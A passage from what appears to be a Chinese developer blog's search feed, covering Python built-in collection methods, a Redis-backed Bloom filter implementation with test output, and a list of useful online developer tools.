comment"># m的索引 找不到抛异常</span>x<span class="token punctuation">.</span>find<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># m的索引 找不到返-1</span>x<span class="token punctuation">.</span>count<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 计数</span>x<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 是否是数字</span>x<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 是否是字母</span>x<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 是否是大写</span>x<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 是否是小写</span>x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 是否以m开头</span>x<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 是否以m结尾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h5 id="列表方法"><a href="#列表方法" class="headerlink" title="列表方法"></a>列表方法</h5><ol><li>增<pre class="line-numbers language-python" data-language="python"><code class="language-python">li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">)</span>li<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>x<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token comment"># 在x下标处插入m</span>li<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>删<pre class="line-numbers language-python" data-language="python"><code class="language-python">li<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment"># 删除并返回该元素的值，若无参数则从最后开始删</span>li<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 删掉第一个m</span>li<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 清空 py2无此方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>改<pre class="line-numbers language-python" data-language="python"><code class="language-python">li<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查 <pre class="line-numbers language-python" data-language="python"><code class="language-python">li<span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># m索引的内容</span>li<span class="token punctuation">.</span>count<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># m的数量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>浅复制<pre class="line-numbers language-python" data-language="python"><code class="language-python">copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>深复制<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> copyli2 <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>li1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>永久排序<pre class="line-numbers language-python" data-language="python"><code class="language-python">li<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">/</span><span class="token boolean">False</span><span class="token punctuation">)</span>li<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 倒排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>临时排序<pre class="line-numbers language-python" data-language="python"><code class="language-python">li2 <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>li<span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">/</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># li2是list</span>li2 <span class="token operator">=</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span> <span class="token comment"># li2是listreverseiterator 对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h5 id="元组方法"><a href="#元组方法" class="headerlink" title="元组方法"></a>元组方法</h5><ol><li>查<pre class="line-numbers language-python" data-language="python"><code class="language-python">t<span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">)</span>t<span class="token punctuation">.</span>count<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h5 id="集合方法"><a href="#集合方法" class="headerlink" title="集合方法"></a>集合方法</h5><p><strong>交集&amp;</strong><br><strong>并集|</strong><br><strong>差集-</strong></p><ol><li>增<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">.</span>add<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 随机删除</span>a<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>改<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">.</span>update<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment"># 向集合添加m，m可以为str list tuple set dict</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">.</span>isdisjoint<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment"># 是否存在交集 </span>a<span class="token punctuation">.</span>issubset<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment"># a是否是b的子集</span>a<span class="token punctuation">.</span>issuperset<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment"># a是否是b的父集</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-BloomFilter实现</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-BloomFilter%E5%AE%9E%E7%8E%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-BloomFilter%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>学习笔记，如有不足之处，欢迎指正。</li></ul><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math<span class="token keyword">import</span> time<span class="token keyword">import</span> redis<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">class</span> <span class="token class-name">SimpleHash</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cap<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cap <span class="token operator">=</span> cap        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> seed    <span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        ret <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ret <span class="token operator">+=</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> ret <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cap <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> ret<span class="token keyword">class</span> <span class="token class-name">BloomFilter</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 随机种子</span>    SEEDS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">543</span><span class="token punctuation">,</span> <span class="token number">460</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">876</span><span class="token punctuation">,</span> <span class="token number">796</span><span class="token punctuation">,</span> <span class="token number">607</span><span class="token punctuation">,</span> <span class="token number">650</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">837</span><span class="token punctuation">,</span> <span class="token number">545</span><span class="token punctuation">,</span> <span class="token number">591</span><span class="token punctuation">,</span> <span class="token number">946</span><span class="token punctuation">,</span> <span class="token number">846</span><span class="token punctuation">,</span> <span class="token number">521</span><span class="token punctuation">,</span> <span class="token number">913</span><span class="token punctuation">,</span> <span class="token number">636</span><span class="token punctuation">,</span> <span class="token number">878</span><span class="token punctuation">,</span> <span class="token number">735</span><span class="token punctuation">,</span> <span class="token number">414</span><span class="token punctuation">,</span> <span class="token number">372</span><span class="token punctuation">,</span>             <span class="token number">344</span><span class="token punctuation">,</span> <span class="token number">324</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">327</span><span class="token punctuation">,</span> <span class="token number">891</span><span class="token punctuation">,</span> <span class="token number">798</span><span class="token punctuation">,</span> <span class="token number">933</span><span class="token punctuation">,</span> <span class="token number">493</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">836</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">544</span><span class="token punctuation">,</span> <span class="token number">924</span><span class="token punctuation">,</span> <span class="token number">849</span><span class="token punctuation">,</span> <span class="token number">438</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">862</span><span class="token punctuation">,</span> <span class="token number">648</span><span class="token punctuation">,</span> <span class="token number">338</span><span class="token punctuation">,</span>             <span class="token number">465</span><span class="token punctuation">,</span> <span class="token number">562</span><span class="token punctuation">,</span> <span class="token number">693</span><span class="token punctuation">,</span> <span class="token number">979</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">763</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">387</span><span class="token punctuation">,</span> <span class="token number">374</span><span class="token punctuation">,</span> <span class="token number">349</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">384</span><span class="token punctuation">,</span> <span class="token number">680</span><span class="token punctuation">,</span> <span class="token number">574</span><span class="token punctuation">,</span> <span class="token number">480</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">580</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">535</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span>             <span class="token number">481</span><span class="token punctuation">,</span> <span class="token number">519</span><span class="token punctuation">,</span> <span class="token number">644</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">686</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">424</span><span class="token punctuation">,</span> <span class="token number">326</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">909</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">951</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">812</span><span class="token punctuation">,</span> <span class="token number">901</span><span class="token punctuation">,</span> <span class="token number">926</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">507</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">,</span> <span class="token number">371</span><span class="token punctuation">,</span>             <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">584</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">284</span><span class="token punctuation">,</span> <span class="token number">617</span><span class="token punctuation">,</span> <span class="token number">332</span><span class="token punctuation">,</span> <span class="token number">472</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">605</span><span class="token punctuation">,</span> <span class="token number">262</span><span class="token punctuation">,</span> <span class="token number">355</span><span class="token punctuation">,</span> <span class="token number">526</span><span class="token punctuation">,</span> <span class="token number">647</span><span class="token punctuation">,</span> <span class="token number">923</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">518</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> capacity<span class="token operator">=</span><span class="token number">100000000</span><span class="token punctuation">,</span> error_rate<span class="token operator">=</span><span class="token number">0.0000001</span><span class="token punctuation">,</span> redis_con<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token string">"bloomfilter"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>bit_size <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>capacity <span class="token operator">*</span> math<span class="token punctuation">.</span>log2<span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token operator">*</span> math<span class="token punctuation">.</span>log2<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> error_rate<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 所需位数</span>        self<span class="token punctuation">.</span>hash_time <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>math<span class="token punctuation">.</span>log1p<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> self<span class="token punctuation">.</span>bit_size <span class="token operator">/</span> capacity<span class="token punctuation">)</span>  <span class="token comment"># 最少hash次数</span>        self<span class="token punctuation">.</span>memery <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>self<span class="token punctuation">.</span>bit_size <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">/</span> <span class="token number">1024</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span>  <span class="token comment"># 占用多少M内存</span>        self<span class="token punctuation">.</span>block_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>self<span class="token punctuation">.</span>memery <span class="token operator">/</span> <span class="token number">512</span><span class="token punctuation">)</span>  <span class="token comment"># 需要多少个512M的内存块,value的第一个字符必须是ascii码，最多有256个内存块</span>        self<span class="token punctuation">.</span>seeds <span class="token operator">=</span> self<span class="token punctuation">.</span>SEEDS<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>hash_time<span class="token punctuation">]</span>        self<span class="token punctuation">.</span>key <span class="token operator">=</span> key        self<span class="token punctuation">.</span>N <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">31</span> <span class="token operator">-</span> <span class="token number">1</span>        self<span class="token punctuation">.</span>hash_func <span class="token operator">=</span> <span class="token punctuation">[</span>SimpleHash<span class="token punctuation">(</span>self<span class="token punctuation">.</span>bit_size<span class="token punctuation">,</span> seed<span class="token punctuation">)</span> <span class="token keyword">for</span> seed <span class="token keyword">in</span> self<span class="token punctuation">.</span>seeds<span class="token punctuation">]</span>        self<span class="token punctuation">.</span>redis_con <span class="token operator">=</span> redis_con    <span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>key <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>block_num<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_contains</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> str_input<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> str_input<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>            m5 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>            str_input <span class="token operator">=</span> m5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token boolean">True</span>            name <span class="token operator">=</span> self<span class="token punctuation">.</span>get_key<span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>            <span class="token keyword">for</span> f <span class="token keyword">in</span> self<span class="token punctuation">.</span>hash_func<span class="token punctuation">:</span>                loc <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>                ret <span class="token operator">=</span> ret <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>redis_con<span class="token punctuation">.</span>getbit<span class="token punctuation">(</span>name<span class="token punctuation">,</span> loc<span class="token punctuation">)</span>            <span class="token keyword">return</span> ret        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span>    <span class="token keyword">def</span> <span class="token function">insert</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> str_input<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            m5 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>            str_input <span class="token operator">=</span> m5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            name <span class="token operator">=</span> self<span class="token punctuation">.</span>get_key<span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>            <span class="token keyword">for</span> f <span class="token keyword">in</span> self<span class="token punctuation">.</span>hash_func<span class="token punctuation">:</span>                loc <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>str_input<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>redis_con<span class="token punctuation">.</span>setbit<span class="token punctuation">(</span>name<span class="token punctuation">,</span> loc<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    bloom_filter_redis_conn_args <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"host"</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>        <span class="token string">"port"</span><span class="token punctuation">:</span> <span class="token string">"6379"</span><span class="token punctuation">,</span>        <span class="token string">"db"</span><span class="token punctuation">:</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span>    redis_con <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span><span class="token operator">**</span>bloom_filter_redis_conn_args<span class="token punctuation">)</span><span class="token punctuation">)</span>    bloom_filter <span class="token operator">=</span> BloomFilter<span class="token punctuation">(</span>redis_con<span class="token operator">=</span>redis_con<span class="token punctuation">)</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6100000</span><span class="token punctuation">,</span> <span class="token number">6101000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bloom_filter<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bloom_filter<span class="token punctuation">.</span>is_contains<span class="token punctuation">(</span><span class="token string">"6100101"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="初步结论（本地测试）"><a href="#初步结论（本地测试）" class="headerlink" title="初步结论（本地测试）"></a>初步结论（本地测试）</h4><ul><li>插入1000条耗时在2-4s之间。</li><li>插入和查询耗时基本相同。</li></ul><h4 id="Redis数据查询"><a href="#Redis数据查询" class="headerlink" title="Redis数据查询"></a>Redis数据查询</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">➜  ~ redis-<span class="token function">cli</span> <span class="token operator">--</span>bigkeys <span class="token operator">-</span>i 0<span class="token punctuation">.</span>1 <span class="token operator">-</span>h 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token comment"># Scanning the entire keyspace to find biggest keys as well as</span><span class="token comment"># average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec</span><span class="token comment"># per 100 SCAN commands (not usually needed).</span><span class="token punctuation">[</span>00<span class="token punctuation">.</span>00%<span class="token punctuation">]</span> Biggest string found so far <span class="token string">'bloomfilter0'</span> with 419346305 bytes<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> summary <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Sampled 1 keys in the keyspace!Total key length in bytes is 12 <span class="token punctuation">(</span>avg len 12<span class="token punctuation">.</span>00<span class="token punctuation">)</span>Biggest string found <span class="token string">'bloomfilter0'</span> has 419346305 bytes1 strings with 419346305 bytes <span class="token punctuation">(</span>100<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 419346305<span class="token punctuation">.</span>00<span class="token punctuation">)</span>0 lists with 0 items <span class="token punctuation">(</span>00<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 0<span class="token punctuation">.</span>00<span class="token punctuation">)</span>0 hashs with 0 fields <span class="token punctuation">(</span>00<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 0<span class="token punctuation">.</span>00<span class="token punctuation">)</span>0 streams with 0 entries <span class="token punctuation">(</span>00<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 0<span class="token punctuation">.</span>00<span class="token punctuation">)</span>0 sets with 0 members <span class="token punctuation">(</span>00<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 0<span class="token punctuation">.</span>00<span class="token punctuation">)</span>0 zsets with 0 members <span class="token punctuation">(</span>00<span class="token punctuation">.</span>00% of keys<span class="token punctuation">,</span> avg size 0<span class="token punctuation">.</span>00<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 bloomfilter0 所占内存为400M左右</p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用在线网站</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-%E6%9D%82-%E5%B8%B8%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-%E6%9D%82-%E5%B8%B8%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>欢迎补充</p><h4 id="curl-命令转换"><a href="#curl-命令转换" class="headerlink" title="curl 命令转换"></a>curl 命令转换</h4><p><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p><h4 id="curl-to-Go"><a href="#curl-to-Go" class="headerlink" title="curl-to-Go"></a>curl-to-Go</h4><p><a href="https://mholt.github.io/curl-to-go/">https://mholt.github.io/curl-to-go/</a></p><h4 id="JSON-to-Go"><a href="#JSON-to-Go" class="headerlink" title="JSON-to-Go"></a>JSON-to-Go</h4><p><a href="https://mholt.github.io/json-to-go/">https://mholt.github.io/json-to-go/</a></p><h4 id="mysql-转-ES-工具"><a href="#mysql-转-ES-工具" class="headerlink" title="mysql 转 ES 工具"></a>mysql 转 ES 工具</h4><p><a href="http://www.ischoolbar.com/EsParser/">http://www.ischoolbar.com/EsParser/</a></p><h4 id="json格式化、压缩、转义"><a href="#json格式化、压缩、转义" class="headerlink" title="json格式化、压缩、转义"></a>json格式化、压缩、转义</h4><p><a href="http://www.bejson.com/">http://www.bejson.com/</a></p><h4 id="代码对比"><a href="#代码对比" class="headerlink" title="代码对比"></a>代码对比</h4><p><a href="https://tool.oschina.net/diff">https://tool.oschina.net/diff</a></p><h4 id="corntab"><a href="#corntab" class="headerlink" title="corntab"></a>corntab</h4><p><a href="https://tool.lu/crontab/">https://tool.lu/crontab/</a></p><h4 id="时间戳转换"><a href="#时间戳转换" class="headerlink" title="时间戳转换"></a>时间戳转换</h4><p><a href="https://unixtime.51240.com/">https://unixtime.51240.com/</a></p><h4 id="URL编解码"><a href="#URL编解码" class="headerlink" title="URL编解码"></a>URL编解码</h4><p><a href="http://www.jsons.cn/urlencode/">http://www.jsons.cn/urlencode/</a></p><h4 id="中文字符与Unicode字符相互转换"><a href="#中文字符与Unicode字符相互转换" class="headerlink" title="中文字符与Unicode字符相互转换"></a>中文字符与Unicode字符相互转换</h4><p><a href="https://javawind.net/tools/native2ascii.jsp?action=transform">https://javawind.net/tools/native2ascii.jsp?action=transform</a></p><h4 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h4><p><a href="https://cloudconvert.com/extract-7z-archive">https://cloudconvert.com/extract-7z-archive</a></p><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p><a href="https://app.diagrams.net/">https://app.diagrams.net/</a></p><h4 id="Golang程序员开发效率神器汇总"><a href="#Golang程序员开发效率神器汇总" class="headerlink" title="Golang程序员开发效率神器汇总"></a>Golang程序员开发效率神器汇总</h4><p><a href="https://juejin.cn/post/6844904007169736718">https://juejin.cn/post/6844904007169736718</a></p><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h4 id="加载等待CSS、GIF图"><a href="#加载等待CSS、GIF图" class="headerlink" title="加载等待CSS、GIF图"></a>加载等待CSS、GIF图</h4><p><a href="https://preloaders.net/">https://preloaders.net/</a><br><a href="https://loading.io/">https://loading.io/</a></p><h4 id="CSS代码兼容补全"><a href="#CSS代码兼容补全" class="headerlink" 